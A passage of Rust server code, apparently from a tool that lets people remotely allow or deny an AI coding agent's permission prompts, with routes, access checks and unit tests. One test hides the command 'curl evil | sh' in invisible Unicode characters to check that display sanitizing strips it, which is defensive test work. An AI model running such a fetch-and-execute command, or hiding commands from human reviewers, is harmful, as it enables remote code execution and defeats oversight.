            // reason or set of answers is another answer, and the first one stands.
            Phase::Answered(done)
                if done == decision
                    && row
                        .fit(decision, with.clone())
                        .is_ok_and(|with| with == row.with) =>
            {
                Ok(done)
            }
            Phase::Answered(_) => Err(Refusal::AlreadyAnswered),
            Phase::Ended(Ended::SessionMovedOn) => Err(Refusal::AnsweredInSession),
            Phase::Ended(_) => Err(Refusal::Ended),
        }
    }

    /// What the person sent with the decision of `token`'s request, for the hook that polls it.
    pub(super) fn sent_with(&self, token: &str, id: &str) -> With {
        self.inner
            .lock()
            .ok()
            .and_then(|inner| {
                let row = inner.rows.get(id).filter(|row| row.token == token)?;
                Some(row.with.clone())
            })
            .unwrap_or_default()
    }
}

pub fn routes() -> Router<HubState> {
    Router::new()
        .route(
            "/v1/hub/permission/register",
            post(register).layer(DefaultBodyLimit::max(MAX_REGISTER_BYTES)),
        )
        .route("/v1/hub/permission/poll", post(poll))
        .route("/v1/hub/session/permissions", get(list))
        .route("/v1/hub/session/permissions/answer", post(answer))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct HookQuery {
    repo: Option<String>,
}

/// The hook's token must be for the repository it names, as on the Hub's hook route.
fn same_repo(
    query: std::result::Result<Query<HookQuery>, QueryRejection>,
    principal: &Principal,
) -> std::result::Result<(), ApiError> {
    let Query(query) = query.map_err(|_| ApiError::invalid())?;
    if query.repo.is_some_and(|repo| repo != principal.repository) {
        return Err(ApiError::new(StatusCode::FORBIDDEN, "wrong_repository"));
    }
    Ok(())
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RegisterBody {
    session: String,
    #[serde(default)]
    agent_id: Option<String>,
    tool: String,
    #[serde(default)]
    summary: Option<String>,
    #[serde(default)]
    folder: Option<String>,
    display: String,
    #[serde(default)]
    missing: Option<Missing>,
    /// From a hook that does not say what is missing: false when some of the request is.
    #[serde(default)]
    complete: Option<bool>,
    #[serde(default)]
    content_hidden: bool,
    input_hash: String,
    #[serde(default)]
    takes_reason: bool,
    #[serde(default)]
    choices: Vec<Choice>,
    #[serde(default)]
    questions: Vec<Question>,
}

#[derive(Serialize)]
struct Registered {
    request_id: String,
    input_hash: String,
    state: &'static str,
}

async fn register(
    State(state): State<HubState>,
    Authenticated(principal): Authenticated,
    query: std::result::Result<Query<HookQuery>, QueryRejection>,
    JsonBody(body): JsonBody<RegisterBody>,
) -> std::result::Result<Json<Registered>, ApiError> {
    same_repo(query, &principal)?;
    let input_hash = body.input_hash.clone();
    let (request_id, polled) = state.onboarding.permissions().register_with(
        state.onboarding.waiting(),
        &principal,
        Registration {
            session: body.session,
            agent_id: body.agent_id,
            tool: body.tool,
            summary: body.summary,
            folder: body.folder,
            display: body.display,
            missing: Missing::stated(body.missing, body.complete),
            content_hidden: body.content_hidden,
            input_hash: body.input_hash,
        },
        Offer {
            takes_reason: body.takes_reason,
            choices: body.choices,
            questions: body.questions,
        },
        unix_now(),
    )?;
    Ok(Json(Registered {
        request_id,
        input_hash,
        state: polled.parts().0,
    }))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct PollBody {
    request_id: String,
    input_hash: String,
    #[serde(default)]
    wait_seconds: u64,
}

#[derive(Serialize)]
struct Polled {
    request_id: String,
    input_hash: String,
    state: &'static str,
    decision: Option<&'static str>,
    /// What the person sent with the decision; no field when there is nothing.
    #[serde(flatten)]
    with: With,
}

async fn poll(
    State(state): State<HubState>,
    Authenticated(principal): Authenticated,
    query: std::result::Result<Query<HookQuery>, QueryRejection>,
    JsonBody(body): JsonBody<PollBody>,
) -> std::result::Result<Json<Polled>, ApiError> {
    same_repo(query, &principal)?;
    if body.wait_seconds > MAX_WAIT_SECONDS {
        return Err(ApiError::invalid().with_message("wait_seconds must be 0..=25"));
    }
    let requests = state.onboarding.permissions();
    requests.follow(&principal, &body.request_id, &body.input_hash, unix_now());
    let polled = requests
        .poll(
            state.onboarding.waiting(),
            &principal.token_id,
            &body.request_id,
            &body.input_hash,
            body.wait_seconds,
        )
        .await
        .ok_or_else(ApiError::not_found)?;
    let (name, decision) = polled.parts();
    let with = match polled {
        Phase::Answered(_) => state
            .onboarding
            .permissions()
            .sent_with(&principal.token_id, &body.request_id),
        _ => With::default(),
    };
    Ok(Json(Polled {
        request_id: body.request_id,
        input_hash: body.input_hash,
        state: name,
        decision,
        with,
    }))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RepositoryQuery {
    repository: String,
}

#[derive(Serialize)]
struct Page {
    requests: Vec<Listed>,
}

async fn list(
    State(state): State<HubState>,
    human: HumanSession,
    query: std::result::Result<Query<RepositoryQuery>, QueryRejection>,
) -> std::result::Result<Json<Page>, ApiError> {
    let Query(query) = query.map_err(|_| ApiError::invalid())?;
    let user = human.web_user()?.clone();
    validate_repository(&query.repository)?;
    // A page polls this, and it shows only the caller's own requests, so it needs the
    // repository's id alone. The answer makes the forge's role check.
    let (store, host) = (state.store.clone(), user.identity.host.clone());
    let repo = blocking(&state, move || {
        store.repository_named(&host, &query.repository)
    })
    .await?
    .ok_or_else(ApiError::not_found)?;
    let requests = state.onboarding.permissions().list(
        state.onboarding.waiting(),
        &user.id,
        Some(repo.repository_id),
        unix_now(),
    )?;
    Ok(Json(Page { requests }))
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct AnswerBody {
    repository: String,
    request_id: String,
    decision: String,
    /// With a deny: what the person typed for the agent.
    #[serde(default)]
    reason: Option<String>,
    /// With an allow: the `id` of one of the request's choices.
    #[serde(default)]
    choice: Option<String>,
    /// With an allow of a question prompt: one answer for each question, in order.
    #[serde(default)]
    answers: Option<Vec<Picked>>,
}

#[derive(Serialize)]
struct Answered {
    state: &'static str,
    decision: &'static str,
}

/// Whether `agent`, one of the person's agent tokens, can take the answer to a request that
/// `token` polls in a repository: that token, or another one for the repository. A computer that
/// renews its token revokes the old one, and the hook polls under the new one only from its next
/// poll on.
fn takes_answer(agent: &AgentToken, token: &str, repository_id: Option<i64>, now: i64) -> bool {
    !agent.revoked
        && !agent.read_only
        && agent.expires_at > now
        && (agent.id == token || agent.repository_id == repository_id)
}

/// A signed-in person allows or denies one prompt of their own agent. The web sign-in and its
/// CSRF token are checked by [`HumanSession`]; the person must still hold an active agent token
/// that can take the answer: the request's own, or another for the same repository.
async fn answer(
    State(state): State<HubState>,
    human: HumanSession,
    JsonBody(body): JsonBody<AnswerBody>,
) -> std::result::Result<Json<Answered>, ApiError> {
    let user = human.web_user()?.clone();
    validate_repository(&body.repository)?;
    let decision = Decision::parse(&body.decision)
        .ok_or_else(|| ApiError::invalid().with_message("decision must be allow or deny"))?;
    let choice = match body.choice.as_deref().map(str::parse::<usize>) {
        None => None,
        Some(Ok(position)) => Some(position),
        Some(Err(_)) => {
            return Err(ApiError::invalid().with_message("choice must be the id of a choice"));
        }
    };
    let said = Said {
        decision,
        with: With {
            reason: body.reason,
            choice,
            answers: body.answers,
        },
    };
    let repo =
        super::login::devices::mint_check(&state, &user, &body.repository, "permissions").await?;
    let requests = state.onboarding.permissions();
    let repository_id = Some(repo.repository_id);
    let token = requests.token_for(&user.id, repository_id, &body.request_id)?;
    let store = state.store.clone();
    let owner = user.id.clone();
    blocking(&state, move || {
        let now = unix_now();
        let live = store
            .list_agent_tokens(&owner)?
            .iter()
            .any(|agent| takes_answer(agent, &token, repository_id, now));
        if live {
            Ok(())
        } else {
            Err(HubError::Unauthorized)
        }
    })
    .await
    .map_err(|error| match error {
        HubError::Unauthorized => not_your_agent(),
        other => other.into(),
    })?;
    let done = requests.answer(
        state.onboarding.waiting(),
        &user.id,
        repository_id,
        &body.request_id,
        said,
        unix_now(),
    )?;
    Ok(Json(Answered {
        state: "answered",
        decision: done.code(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::hub::session_waiting::GRACE_SECONDS;

    /// A session its host named, as the native hooks report one.
    const NAMED: &str = "0a1b2c3d-0000-4000-8000-000000000001";
    use crate::hub::store::{ForgeIdentity, User};

    const HASH: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
    const OTHER_HASH: &str = "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

    fn principal(token: &str, owner: &str, repository: &str) -> Principal {
        Principal {
            token_id: token.into(),
            name: format!("{token}-laptop"),
            repository: repository.into(),
            repository_id: Some(7),
            expires_at: i64::MAX,
            read_only: false,
            owner: User {
                id: owner.into(),
                identity: ForgeIdentity {
                    provider: "github".into(),
                    host: "github.com".into(),
                    user_id: 1,
                },
                login: owner.into(),
                name: None,
                disabled: false,
            },
        }
    }

    fn registration(session: &str, agent_id: Option<&str>, hash: &str) -> Registration {
        Registration {
            session: session.into(),
            agent_id: agent_id.map(str::to_owned),
            tool: "Bash".into(),
            summary: None,
            folder: None,
            display: "git push origin main".into(),
            missing: Missing::default(),
            content_hidden: false,
            input_hash: hash.into(),
        }
    }

    fn wait(
        waiting: &Waiting,
        who: &Principal,
        native: &str,
        reason: WaitReason,
        asker: Option<&str>,
        now: i64,
    ) {
        waiting
            .record(who, native, native, "claude", reason, asker, None, now)
            .unwrap();
    }

    /// A confirmed pending request of `mine` on session `s`, waiting since 1_000.
    fn pending(requests: &Requests, waiting: &Waiting, mine: &Principal) -> String {
        wait(waiting, mine, "s", WaitReason::Permission, None, 1_000);
        requests.confirm(&mine.token_id, "s", 1_001);
        let (id, state) = requests
            .register(waiting, mine, registration("s", None, HASH), 1_002)
            .unwrap();
        assert_eq!(state, Phase::Pending);
        id
    }

    #[test]
    fn registering_needs_the_same_permission_wait_and_a_usable_token() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let register = |p: &Principal, session, agent: Option<&str>| {
            requests
                .register(&waiting, p, registration(session, agent, HASH), 1_010)
                .map(|(_, state)| state)
        };
        assert!(matches!(
            register(&mine, "s", None),
            Err(Refusal::NotWaiting)
        ));
        wait(&waiting, &mine, "s", WaitReason::Idle, None, 1_000);
        assert!(matches!(
            register(&mine, "s", None),
            Err(Refusal::NotWaiting)
        ));
        wait(
            &waiting,
            &mine,
            "s",
            WaitReason::Permission,
            Some("sub"),
            1_001,
        );
        assert!(matches!(
            register(&mine, "s", None),
            Err(Refusal::NotWaiting)
        ));
        assert!(matches!(
            register(&mine, "s", Some("other")),
            Err(Refusal::NotWaiting)
        ));
        assert!(matches!(
            register(&mine, "s", Some("sub")),
            Ok(Phase::Unconfirmed)
        ));
        // Another token has no wait under that session name.
        let theirs = principal("tok_b", "usr_them", "acme/widgets");
        assert!(matches!(
            register(&theirs, "s", Some("sub")),
            Err(Refusal::NotWaiting)
        ));
        let mut reader = mine.clone();
        reader.read_only = true;
        assert!(matches!(
            register(&reader, "s", Some("sub")),
            Err(Refusal::Hub(HubError::Unauthorized))
        ));
    }

    #[test]
    fn registering_again_returns_the_request_and_a_new_prompt_supersedes_it() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let first = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_001)
            .unwrap()
            .0;
        let again = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_002)
            .unwrap()
            .0;
        assert_eq!(first, again);
        let second = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), 1_003)
            .unwrap()
            .0;
        assert_ne!(first, second);
        assert_eq!(
            requests.check(&waiting, "tok_a", &first, HASH, 1_004),
            Some(Phase::Ended(Ended::Superseded))
        );
        assert_eq!(
            requests.check(&waiting, "tok_a", &second, OTHER_HASH, 1_004),
            Some(Phase::Unconfirmed)
        );
    }

    #[test]
    fn the_hub_holds_a_bounded_number_of_requests_and_ends_none_for_room() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        // Many sessions of one person on one token all keep their requests.
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let mut ids = Vec::new();
        for n in 0..40 {
            let session = format!("s{n}");
            wait(
                &waiting,
                &mine,
                &session,
                WaitReason::Permission,
                None,
                1_000,
            );
            ids.push(
                requests
                    .register(&waiting, &mine, registration(&session, None, HASH), 1_001)
                    .unwrap()
                    .0,
            );
        }
        for id in &ids {
            assert_eq!(
                requests.check(&waiting, "tok_a", id, HASH, 1_010),
                Some(Phase::Unconfirmed)
            );
        }
        // Past the Hub's bound a new request is refused.
        let mut refused = false;
        'fill: for t in 0..(MAX_LIVE / 64 + 2) {
            let who = principal(&format!("tok_{t}"), &format!("usr_{t}"), "acme/widgets");
            for n in 0..64 {
                let session = format!("c{n}");
                wait(
                    &waiting,
                    &who,
                    &session,
                    WaitReason::Permission,
                    None,
                    1_000,
                );
                let outcome =
                    requests.register(&waiting, &who, registration(&session, None, HASH), 1_010);
                if matches!(outcome, Err(Refusal::Busy)) {
                    refused = true;
                    break 'fill;
                }
                outcome.unwrap();
            }
        }
        assert!(refused, "the hub-wide bound refused a request");
        // The requests that already waited are still open.
        assert_eq!(
            requests.check(&waiting, "tok_a", &ids[0], HASH, 1_020),
            Some(Phase::Unconfirmed)
        );
    }

    #[test]
    fn a_request_sleeps_while_its_hook_is_quiet_and_ends_at_the_limit() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_000)
            .unwrap()
            .0;
        requests.confirm("tok_a", "s", 1_001);
        let key = wait_key("tok_a", "s");
        assert!(requests.answerable(&waiting, &key, 1_002));
        // A hook that has not polled for a minute would not hear an answer, so none is taken.
        let quiet = 1_000 + HOOK_GONE_SECONDS;
        assert!(!requests.answerable(&waiting, &key, quiet));
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, quiet),
            Err(Refusal::Ended)
        ));
        // An hour later the computer is awake and the hook polls: the same request is offered
        // again, shown as it was.
        let back = quiet + 3_600;
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, back),
            Some(Phase::Pending)
        );
        assert!(requests.answerable(&waiting, &key, back));
        // Asleep again, it is over when the session shows another prompt in the same wait.
        let asleep = back + HOOK_GONE_SECONDS;
        assert!(!requests.answerable(&waiting, &key, asleep));
        let other = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), asleep)
            .unwrap()
            .0;
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, asleep),
            Some(Phase::Ended(Ended::Superseded))
        );
        // A request does not wake once its session has moved on.
        waiting.clear("tok_a", "s", None, true);
        let gone = asleep + HOOK_GONE_SECONDS + 10;
        assert_eq!(
            requests.check(&waiting, "tok_a", &other, OTHER_HASH, gone),
            Some(Phase::Ended(Ended::HookGone))
        );
        // Kept polling, a request lives until the limit.
        wait(&waiting, &mine, "s", WaitReason::Permission, None, gone);
        let id = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), gone)
            .unwrap()
            .0;
        let mut now = gone;
        while now - gone < TTL_SECONDS - 30 {
            now += 30;
            wait(&waiting, &mine, "s", WaitReason::Permission, None, now);
            assert_eq!(
                requests.check(&waiting, "tok_a", &id, OTHER_HASH, now),
                Some(Phase::Unconfirmed)
            );
        }
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, OTHER_HASH, gone + TTL_SECONDS),
            Some(Phase::Ended(Ended::Expired))
        );
    }

    #[test]
    fn only_the_registering_token_with_the_right_id_and_hash_can_poll() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_003),
            Some(Phase::Pending)
        );
        assert_eq!(requests.check(&waiting, "tok_b", &id, HASH, 1_003), None);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, OTHER_HASH, 1_003),
            None
        );
        assert_eq!(requests.check(&waiting, "tok_a", "nope", HASH, 1_003), None);
    }

    #[tokio::test]
    async fn a_held_poll_returns_when_the_person_answers() {
        let requests = std::sync::Arc::new(Requests::default());
        let waiting = std::sync::Arc::new(Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let now = unix_now();
        wait(&waiting, &mine, "s", WaitReason::Permission, None, now);
        requests.confirm("tok_a", "s", now);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), now)
            .unwrap()
            .0;
        let answering = {
            let (requests, waiting, id) = (requests.clone(), waiting.clone(), id.clone());
            tokio::spawn(async move {
                tokio::time::sleep(Duration::from_millis(100)).await;
                requests
                    .answer(
                        &waiting,
                        "usr_me",
                        Some(7),
                        &id,
                        Decision::Allow,
                        unix_now(),
                    )
                    .unwrap()
            })
        };
        let started = Instant::now();
        let polled = requests.poll(&waiting, "tok_a", &id, HASH, 20).await;
        assert_eq!(polled, Some(Phase::Answered(Decision::Allow)));
        assert!(started.elapsed() < Duration::from_secs(5));
        answering.await.unwrap();
        // A lost reply can be read again.
        assert_eq!(
            requests.poll(&waiting, "tok_a", &id, HASH, 0).await,
            Some(Phase::Answered(Decision::Allow))
        );
        assert_eq!(requests.poll(&waiting, "tok_b", &id, HASH, 0).await, None);
    }

    #[test]
    fn a_request_ends_when_its_wait_is_cleared_replaced_or_asked_by_another_subagent() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        waiting.clear("tok_a", "s", None, true);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_003),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
        let id = pending(&requests, &waiting, &mine);
        wait(&waiting, &mine, "s", WaitReason::Idle, None, 1_050);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_051),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
        // A permission wait asked by a subagent is a different wait.
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_060);
        let id = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), 1_061)
            .unwrap()
            .0;
        wait(
            &waiting,
            &mine,
            "s",
            WaitReason::Permission,
            Some("sub"),
            1_062,
        );
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, OTHER_HASH, 1_063),
            Some(Phase::Ended(Ended::SessionMovedOn))
        );
    }

    #[test]
    fn a_request_is_unconfirmed_until_the_host_shows_its_prompt() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_001)
            .unwrap()
            .0;
        // Hidden from the person and not answerable while unconfirmed.
        assert!(
            requests
                .list(&waiting, "usr_me", Some(7), 1_000 + GRACE_SECONDS)
                .unwrap()
                .is_empty()
        );
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Deny, 1_002),
            Err(Refusal::NotFound)
        ));
        // Another session's notification does not confirm it.
        requests.confirm("tok_a", "other", 1_003);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_004),
            Some(Phase::Unconfirmed)
        );
        requests.confirm("tok_a", "s", 1_005);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_006),
            Some(Phase::Pending)
        );
        // The notification may come first, within a few seconds before the request.
        wait(&waiting, &mine, "t", WaitReason::Permission, None, 2_000);
        requests.confirm("tok_a", "t", 2_001);
        let early = requests
            .register(
                &waiting,
                &mine,
                registration("t", None, HASH),
                2_001 + CONFIRM_SLACK_SECONDS,
            )
            .unwrap();
        assert_eq!(early.1, Phase::Pending);
        wait(&waiting, &mine, "u", WaitReason::Permission, None, 3_000);
        requests.confirm("tok_a", "u", 3_001);
        let late = requests
            .register(
                &waiting,
                &mine,
                registration("u", None, HASH),
                3_001 + CONFIRM_SLACK_SECONDS + 1,
            )
            .unwrap();
        assert_eq!(late.1, Phase::Unconfirmed);
    }

    #[test]
    fn a_full_confirmation_map_still_confirms_the_requests_already_waiting() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let id = requests
            .register(&waiting, &mine, registration("s", None, HASH), 1_001)
            .unwrap()
            .0;
        {
            let mut inner = requests.inner.lock().unwrap();
            for n in 0..MAX_CONFIRMATIONS {
                inner.prompts.insert((format!("t{n}"), "x".into()), 1_002);
            }
        }
        requests.confirm("tok_a", "s", 1_003);
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_004),
            Some(Phase::Pending)
        );
        // Only the memory of an early prompt was skipped; the map did not grow.
        assert_eq!(
            requests.inner.lock().unwrap().prompts.len(),
            MAX_CONFIRMATIONS
        );
    }

    #[test]
    fn only_the_owner_answers_once_and_may_allow_a_request_shown_in_part() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        let answer = |owner, repository, decision| {
            requests.answer(&waiting, owner, repository, &id, decision, 1_010)
        };
        assert!(matches!(
            answer("usr_them", Some(7), Decision::Deny),
            Err(Refusal::NotYours)
        ));
        assert!(matches!(
            answer("usr_me", Some(8), Decision::Deny),
            Err(Refusal::NotYours)
        ));
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), "nope", Decision::Deny, 1_010),
            Err(Refusal::NotFound)
        ));
        assert!(matches!(
            requests.token_for("usr_them", Some(7), &id),
            Err(Refusal::NotYours)
        ));
        assert_eq!(requests.token_for("usr_me", Some(7), &id).unwrap(), "tok_a");
        assert!(matches!(
            answer("usr_me", Some(7), Decision::Allow),
            Ok(Decision::Allow)
        ));
        assert!(matches!(
            answer("usr_me", Some(7), Decision::Allow),
            Ok(Decision::Allow)
        ));
        assert!(matches!(
            answer("usr_me", Some(7), Decision::Deny),
            Err(Refusal::AlreadyAnswered)
        ));
        assert_eq!(
            requests.check(&waiting, "tok_a", &id, HASH, 1_011),
            Some(Phase::Answered(Decision::Allow))
        );

        // A request shown only in part can be allowed too, and the list says what is missing:
        // the hook's facts, with the Hub's own count of what it dropped and its own cut.
        let theirs = principal("tok_b", "usr_me", "acme/widgets");
        wait(&waiting, &theirs, "s", WaitReason::Permission, None, 1_000);
        requests.confirm("tok_b", "s", 1_001);
        let mut partial = registration("s", None, HASH);
        partial.display = format!("ls\u{200b}{}", "x".repeat(MAX_DISPLAY_CHARS));
        partial.missing = Missing {
            cut_from: Some(30_000),
            redacted: 2,
            dropped: 99,
            unshown: vec!["dangerouslyDisableSandbox\u{202e}".into(), " ".into()],
        };
        let partial_id = requests
            .register(&waiting, &theirs, partial, 1_002)
            .unwrap()
            .0;
        let at = 1_000 + GRACE_SECONDS;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        let row = shown
            .iter()
            .find(|row| row.request_id == partial_id)
            .unwrap();
        assert_eq!((row.allowable, row.complete), (true, false));
        assert_eq!(
            row.missing,
            Missing {
                cut_from: Some(30_000),
                redacted: 2,
                dropped: 1,
                unshown: vec!["dangerouslyDisableSandbox".into(), UNREADABLE_NAME.into()],
            }
        );
        // A hook from before `missing` says only whether anything is.
        let unstated = Missing {
            unshown: vec![UNSTATED_PART.into()],
            ..Missing::default()
        };
        assert_eq!(Missing::stated(None, Some(true)), Missing::default());
        assert_eq!(Missing::stated(None, Some(false)), unstated);
        assert_eq!(Missing::stated(None, None), unstated);
        assert_eq!(
            Missing::stated(Some(Missing::default()), Some(false)),
            Missing::default()
        );
        assert!(matches!(
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &partial_id,
                Decision::Allow,
                at
            ),
            Ok(Decision::Allow)
        ));
    }

    #[test]
    fn an_answer_after_the_prompt_closed_says_where_it_went() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        waiting.clear("tok_a", "s", None, true);
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, 1_010),
            Err(Refusal::AnsweredInSession)
        ));
        // Past the retention it is simply unknown.
        assert!(matches!(
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &id,
                Decision::Allow,
                1_010 + RETAIN_SECONDS
            ),
            Err(Refusal::NotFound)
        ));
        let id = pending(&requests, &waiting, &mine);
        // The hook went quiet: ended, but not because the session moved on.
        assert!(matches!(
            requests.answer(
                &waiting,
                "usr_me",
                Some(7),
                &id,
                Decision::Allow,
                1_002 + HOOK_GONE_SECONDS
            ),
            Err(Refusal::Ended)
        ));
    }

    #[test]
    fn the_list_shows_only_the_owners_confirmed_requests_in_one_repository() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        let id = pending(&requests, &waiting, &mine);
        let at = 1_000 + GRACE_SECONDS;
        // The list is where a person answers, so a confirmed request is on it within the
        // wait's first minute, before their status mentions the wait.
        assert_eq!(
            requests
                .list(&waiting, "usr_me", Some(7), 1_010)
                .unwrap()
                .len(),
            1
        );
        assert!(waiting.owned(&mine, 1_010).unwrap().is_empty());
        // Another person, another repository: nothing.
        assert!(
            requests
                .list(&waiting, "usr_them", Some(7), at)
                .unwrap()
                .is_empty()
        );
        assert!(
            requests
                .list(&waiting, "usr_me", Some(8), at)
                .unwrap()
                .is_empty()
        );
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        assert_eq!(shown.len(), 1);
        assert_eq!(
            (shown[0].request_id.as_str(), shown[0].since, shown[0].state),
            (id.as_str(), 1_000, "pending")
        );
        assert_eq!(
            shown[0].item_id,
            format!("waiting:permission:{}", wait_key("tok_a", "s"))
        );
        let text = serde_json::to_string(&shown).unwrap();
        assert!(!text.contains(HASH) && !text.contains("tok_a") && !text.contains("\"s\""));
        assert!(requests.answerable(&waiting, &wait_key("tok_a", "s"), at));
        requests
            .answer(&waiting, "usr_me", Some(7), &id, Decision::Deny, at)
            .unwrap();
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        assert_eq!(
            (shown[0].state, shown[0].decision),
            ("answered", Some("deny"))
        );
        assert!(!requests.answerable(&waiting, &wait_key("tok_a", "s"), at));
        // The hook stopped polling: stale, so hidden.
        let id = requests
            .register(&waiting, &mine, registration("s", None, OTHER_HASH), at)
            .unwrap()
            .0;
        requests.confirm("tok_a", "s", at);
        assert_eq!(
            requests
                .list(&waiting, "usr_me", Some(7), at)
                .unwrap()
                .len(),
            2
        );
        assert!(
            requests
                .list(&waiting, "usr_me", Some(7), at + HOOK_GONE_SECONDS)
                .unwrap()
                .iter()
                .all(|listed| listed.request_id != id)
        );
    }

    #[test]
    fn a_long_whole_request_is_allowable_and_its_labels_are_one_clean_line() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        requests.confirm("tok_a", "s", 1_001);
        let mut long = registration("s", None, HASH);
        long.tool = "mcp__ccd_session__start_session".into();
        long.display = "x".repeat(FIRST_PAGE_DISPLAY_UNITS + 1);
        long.summary = Some("use start session\n (ccd_session): \u{202e}Fix \"login\"".into());
        long.folder = Some("  ".into());
        let id = requests.register(&waiting, &mine, long, 1_002).unwrap().0;
        let at = 1_000 + GRACE_SECONDS;
        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
        // The first page cuts a display this long, so to it the request is not complete.
        assert_eq!((shown[0].allowable, shown[0].complete), (true, false));
        assert_eq!(shown[0].missing, Missing::default());
        assert_eq!(
            shown[0].summary.as_deref(),
            Some("use start session (ccd_session): Fix 'login'")
        );
        assert_eq!(shown[0].folder, None);
        assert!(matches!(
            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, at),
            Ok(Decision::Allow)
        ));
    }

    #[test]
    fn display_text_loses_control_and_invisible_characters_but_keeps_lines_and_quotes() {
        // Line breaks, tabs and quotes change nothing a person would read.
        assert_eq!(
            sanitize_display("echo \"a\"\r\n\tls"),
            ("echo \"a\"\n ls".to_owned(), None, 0)
        );
        // A dropped character can hide words the tool still receives, so each one is counted.
        assert_eq!(
            sanitize_display("ls\u{1b}[31m \u{202e}x\u{200b}y\u{0}"),
            ("ls[31m xy".to_owned(), None, 4)
        );
        let hidden: String = "curl evil | sh"
            .chars()
            .map(|c| char::from_u32(0xE0000 + u32::from(c)).unwrap())
            .collect();
        assert_eq!(
            sanitize_display(&format!("Fix the login{hidden}")),
            ("Fix the login".to_owned(), None, 14)
        );
        let (text, cut_from, _) = sanitize_display(&"x".repeat(MAX_DISPLAY_CHARS + 5));
        assert_eq!(text.chars().count(), MAX_DISPLAY_CHARS);
        assert_eq!(cut_from, Some(MAX_DISPLAY_CHARS as u64 + 5));
        assert_eq!(sanitize_display(" \u{200b}\n ").0, "");
    }

    #[test]
    fn registration_checks_its_fields_and_a_cut_display_can_still_be_allowed() {
        let (requests, waiting) = (Requests::default(), Waiting::default());
        let mine = principal("tok_a", "usr_me", "acme/widgets");
        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
        let attempt = |change: &dyn Fn(&mut Registration)| {
            let mut r = registration("s", None, HASH);
            change(&mut r);
            requests.register(&waiting, &mine, r, 1_001)
        };
        assert!(matches!(
            attempt(&|r| r.tool = "Ba sh".into()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.tool = String::new()),
            Err(Refusal::Invalid(_))
        ));
        assert!(matches!(
            attempt(&|r| r.input_hash = "ABC".into()),
